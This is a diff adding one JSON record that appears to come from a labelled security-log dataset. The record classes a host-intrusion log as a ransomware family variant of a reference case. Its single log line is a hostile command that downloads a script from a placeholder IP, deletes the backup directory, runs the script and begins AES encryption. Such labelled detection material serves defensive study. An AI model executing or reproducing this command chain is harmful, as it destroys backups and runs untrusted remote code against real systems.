@@ -1,0 +1,25 @@
+{
+ "unit": 1099,
+ "gt": {
+  "gt_class": "family_variant",
+  "gt_case": "CASE-005",
+  "confidence": "medium",
+  "needs_review": true,
+  "reason": "勒索家族变体：阶段组合与 CASE-005 不完全一致"
+ },
+ "technique": "curl 下载加密脚本落地即执行并删除归档备份目录",
+ "sources": [
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-02 16:44:09",
+   "source": "hids",
+   "log_id": "HID0450066",
+   "content": "curl -fsSL 203.0.113.44/upd.sh -o /tmp/.u.sh && rm -rf /backup/* && sh /tmp/.u.sh && openssl enc -aes-256-cbc ",
+   "event_id": "1099-HID0450066"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
